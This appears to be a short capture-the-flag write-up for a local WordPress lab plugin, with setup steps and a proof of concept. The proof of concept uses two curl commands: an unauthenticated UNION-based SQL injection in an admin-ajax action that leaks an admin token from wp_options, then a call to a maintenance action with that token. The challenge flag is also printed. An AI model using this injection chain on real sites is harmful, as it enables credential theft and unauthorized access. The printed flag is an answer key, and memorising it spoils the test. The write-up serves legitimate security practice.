## SETUP
1. `sudo docker-compose up -d` 
2. access web and finish the wordpress setup
3. move the plugins directory to /wp-content/plugins/`<here>`
4. Activate the plugins

<br>

## PoC:
1. Leaking admin token:

        curl "http://localhost:8081/wp-admin/admin-ajax.php?action=aaf_load_data&rid=-1+UNION+SELECT+option_value,1+FROM+wp_options+WHERE+option_name=0x6161665f61646d696e5f746f6b656e" \
            -H "User-Agent: F-Side"

2. Get flag:

        curl -X POST http://localhost:8081/wp-admin/admin-ajax.php \
            -H "User-Agent: F-Side" \
            -d "action=aaf_sys_maintenance" \
            -d "auth_token=<leaked-token>"

<br>

## Flag
`RE:CTF{ezchainingunauthsqli2bac_oleeoleee}`